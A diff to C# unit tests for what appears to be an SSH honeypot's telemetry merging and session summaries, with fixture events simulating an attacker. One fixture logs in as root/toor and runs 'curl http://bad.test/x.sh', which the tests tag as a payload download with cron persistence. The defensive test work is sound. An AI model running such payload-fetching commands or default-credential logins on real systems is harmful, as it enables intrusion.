@@ -863,6 +863,8 @@ public class TelemetryWriteQueueTests
 
             File.WriteAllLines(Path.Combine(repoData, "events.jsonl"), new[] { "{\"Event\":\"session_start\",\"id\":\"1\"}", "{\"Event\":\"command\",\"id\":\"2\"}" });
             File.WriteAllLines(Path.Combine(snapData, "events.jsonl"), new[] { "{\"Event\":\"command\",\"id\":\"2\"}", "{\"Event\":\"session_end\",\"id\":\"3\"}" });
+            File.WriteAllText(Path.Combine(repoData, "sessions.json"), "[{\"SessionId\":\"existing\",\"StartedAt\":\"2026-09-04T08:00:00Z\"}]");
+            File.WriteAllText(Path.Combine(snapData, "sessions.json"), "[{\"SessionId\":\"snapshot\",\"StartedAt\":\"2026-09-04T09:00:00Z\"}]");
 
             Logger.RestorePublicationSnapshot(tempRepo, (tempSnapshot, HasStats: false, HasData: true));
 
@@ -871,6 +873,11 @@ public class TelemetryWriteQueueTests
             Assert.Contains("{\"Event\":\"session_start\",\"id\":\"1\"}", mergedLines);
             Assert.Contains("{\"Event\":\"command\",\"id\":\"2\"}", mergedLines);
             Assert.Contains("{\"Event\":\"session_end\",\"id\":\"3\"}", mergedLines);
+            var mergedSessions = System.Text.Json.JsonSerializer.Deserialize<List<SessionDebrief>>(File.ReadAllText(Path.Combine(repoData, "sessions.json")));
+            Assert.NotNull(mergedSessions);
+            Assert.Equal(2, mergedSessions.Count);
+            Assert.Contains(mergedSessions, session => session.SessionId == "existing");
+            Assert.Contains(mergedSessions, session => session.SessionId == "snapshot");
         }
         finally
         {
@@ -908,12 +915,14 @@ public class TelemetryWriteQueueTests
             Directory.CreateDirectory(dataDir);
             var events = new[]
             {
-                "{\"Timestamp\":\"2026-09-04T08:00:00Z\",\"Event\":\"session_start\",\"SessionId\":\"s1\",\"Sequence\":1,\"Data\":{\"RemoteEndpoint\":\"1.2.3.4:1234\"}}",
-                "{\"Timestamp\":\"2026-09-04T08:00:01Z\",\"Event\":\"auth_attempt\",\"SessionId\":\"s1\",\"Sequence\":2,\"Data\":{\"Username\":\"root\",\"Password\":\"toor\",\"Accepted\":true}}",
-                "{\"Timestamp\":\"2026-09-04T08:00:02Z\",\"Event\":\"shell_session_start\",\"SessionId\":\"s1\",\"Sequence\":3,\"Data\":{\"TimeToCompromiseMs\":200}}",
-                "{\"Timestamp\":\"2026-09-04T08:00:03Z\",\"Event\":\"command\",\"SessionId\":\"s1\",\"Sequence\":4,\"ExchangeId\":\"s1:1\",\"Data\":{\"Command\":\"uname -a\",\"MitreAttackTechniques\":[\"Discovery\"]}}",
-                "{\"Timestamp\":\"2026-09-04T08:00:04Z\",\"Event\":\"command_result\",\"SessionId\":\"s1\",\"Sequence\":5,\"ExchangeId\":\"s1:1\",\"Data\":{\"Response\":\"Linux\",\"ResponseDurationMs\":50}}",
-                "{\"Timestamp\":\"2026-09-04T08:00:05Z\",\"Event\":\"session_end\",\"SessionId\":\"s1\",\"Sequence\":6,\"Data\":{\"DurationSeconds\":5.0}}"
+                "{\"Timestamp\":\"2026-09-04T08:00:00Z\",\"Event\":\"session_start\",\"SessionId\":\"s1\",\"Sequence\":1,\"Data\":{\"RemoteEndpoint\":\"1.2.3.4:1234\",\"ClientVersion\":\"pending\",\"SshBanner\":\"SSH-2.0-Test\"}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:01Z\",\"Event\":\"auth_attempt\",\"SessionId\":\"s1\",\"Sequence\":2,\"Data\":{\"RemoteEndpoint\":\"1.2.3.4:1234\",\"Username\":\"root\",\"Password\":\"toor\",\"AuthMethod\":\"password\",\"ConnectionAttemptNumber\":3,\"Accepted\":true,\"AcceptanceReason\":\"harvest_threshold\"}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:02Z\",\"Event\":\"shell_session_start\",\"SessionId\":\"s1\",\"Sequence\":3,\"ChannelId\":\"ch1\",\"Data\":{\"Username\":\"root\",\"ClientVersion\":\"SSH-2.0-RealClient\",\"TimeToCompromiseMs\":200}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:03Z\",\"Event\":\"command\",\"SessionId\":\"s1\",\"Sequence\":4,\"ChannelId\":\"ch1\",\"ExchangeId\":\"s1:1\",\"Data\":{\"MessageNumber\":1,\"ShellMessageNumber\":1,\"Command\":\"id\",\"CommandSequenceLatencyMs\":125,\"ActorAutomationHint\":\"automation\",\"SemanticComplexity\":1,\"AssetValuePerceptionScore\":4,\"MitreAttackTechniques\":[\"Discovery\"]}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:04Z\",\"Event\":\"command\",\"SessionId\":\"s1\",\"Sequence\":5,\"ChannelId\":\"ch1\",\"ExchangeId\":\"s1:2\",\"Data\":{\"MessageNumber\":2,\"ShellMessageNumber\":2,\"Command\":\"curl http://bad.test/x.sh\",\"PayloadUrls\":[\"http://bad.test/x.sh\"],\"EgressTargets\":[\"bad.test\"],\"PersistenceVector\":\"cron\",\"MitreAttackTechniques\":[\"Command and Control\"]}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:05Z\",\"Event\":\"command_result\",\"SessionId\":\"s1\",\"Sequence\":6,\"ChannelId\":\"ch1\",\"ExchangeId\":\"s1:2\",\"Data\":{\"MessageNumber\":2,\"Command\":\"curl http://bad.test/x.sh\",\"Response\":\"blocked\",\"ResponseDurationMs\":50,\"PromptTokens\":12,\"CompletionTokens\":3,\"BlockedOperation\":true,\"FailedCommand\":true,\"ResponseSource\":\"input validation\"}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:06Z\",\"Event\":\"shell_session_end\",\"SessionId\":\"s1\",\"Sequence\":7,\"ChannelId\":\"ch1\",\"Data\":{\"Username\":\"root\",\"ClientVersion\":\"SSH-2.0-RealClient\",\"SshBanner\":\"SSH-2.0-Test\",\"DurationSeconds\":6.0}}",
+                "{\"Timestamp\":\"2026-09-04T08:00:07Z\",\"Event\":\"session_end\",\"SessionId\":\"s1\",\"Sequence\":8,\"Data\":{\"DurationSeconds\":7.0}}"
             };
             File.WriteAllLines(Path.Combine(dataDir, "events.jsonl"), events);
 
@@ -925,18 +934,40 @@ public class TelemetryWriteQueueTests
 
             var summary = System.Text.Json.JsonSerializer.Deserialize<HarvestSummary>(File.ReadAllText(Path.Combine(dataDir, "events_summary.json")));
             Assert.NotNull(summary);
-            Assert.Equal(6, summary.TotalEvents);
+            Assert.Equal(8, summary.TotalEvents);
             Assert.Equal(1, summary.TotalShells);
-            Assert.Equal(1, summary.EventCounts["command"]);
+            Assert.Equal(2, summary.EventCounts["command"]);
+            Assert.Equal(1, summary.TotalScanAttempts);
+            Assert.Equal(1, summary.ScansByIp["1.2.3.4"]);
+
+            var stats = System.Text.Json.JsonSerializer.Deserialize<GlobalStats>(File.ReadAllText(Path.Combine(tempRepo, "global_stats.json")));
+            Assert.NotNull(stats);
+            Assert.Equal(1, stats.TotalSessions);
+            Assert.Equal(2, stats.TotalCommands);
+            Assert.Equal(1, stats.TotalBlockedOperations);
+            Assert.Equal(12, stats.TotalPromptTokens);
+            Assert.Equal(3, stats.TotalCompletionTokens);
+            Assert.Equal(1, stats.TopUsers["root"]);
+            Assert.Equal(1, stats.SessionsByBanner["SSH-2.0-Test"]);
 
             var sessions = System.Text.Json.JsonSerializer.Deserialize<List<SessionDebrief>>(File.ReadAllText(Path.Combine(dataDir, "sessions.json")));
             Assert.NotNull(sessions);
             Assert.Single(sessions);
             Assert.Equal("s1", sessions[0].SessionId);
             Assert.True(sessions[0].AuthAccepted);
-            Assert.Single(sessions[0].Commands);
-            Assert.Equal("uname -a", sessions[0].Commands[0].Command);
-            Assert.Equal("Linux", sessions[0].Commands[0].Response);
+            Assert.Equal("SSH-2.0-RealClient", sessions[0].ClientVersion);
+            Assert.Equal(8, sessions[0].Timeline.Count);
+            Assert.Equal(2, sessions[0].Commands.Count);
+            Assert.False(sessions[0].Commands[0].HasResponse);
+            Assert.Equal("id", sessions[0].Commands[0].Command);
+            Assert.Equal(125, sessions[0].Commands[0].CommandSequenceLatencyMs);
+            Assert.Equal("automation", sessions[0].Commands[0].ActorAutomationHint);
+            Assert.True(sessions[0].Commands[1].HasResponse);
+            Assert.Equal("blocked", sessions[0].Commands[1].Response);
+            Assert.Equal(DateTime.Parse("2026-09-04T08:00:05Z").ToUniversalTime(), sessions[0].Commands[1].ResponseTimestamp);
+            Assert.Equal("ch1", sessions[0].Commands[1].ChannelId);
+            Assert.Contains("bad.test", sessions[0].Commands[1].EgressTargets);
+            Assert.Equal("cron", sessions[0].Commands[1].PersistenceVector);
         }
         finally
         {
